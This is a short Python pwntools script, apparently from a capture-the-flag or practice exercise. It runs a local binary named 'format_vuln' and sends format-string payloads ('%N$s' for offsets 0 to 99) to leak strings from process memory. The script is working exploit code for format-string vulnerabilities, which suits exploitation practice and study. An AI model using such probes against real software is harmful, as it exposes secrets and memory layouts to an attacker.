from pwn import *

elf = context.binary = ELF('./format_vuln', checksec=False)

for i in range(100):
    try:
        p = process(level='error')
        p.recvline()
        p.clean()
        p.sendline('%{}$s'.format(i).encode())
        result = p.recvline()
        try:
            print(str(result.replace(b"\n",b"").decode()))
        except:
            pass
        p.close()
    except EOFError:
        pass
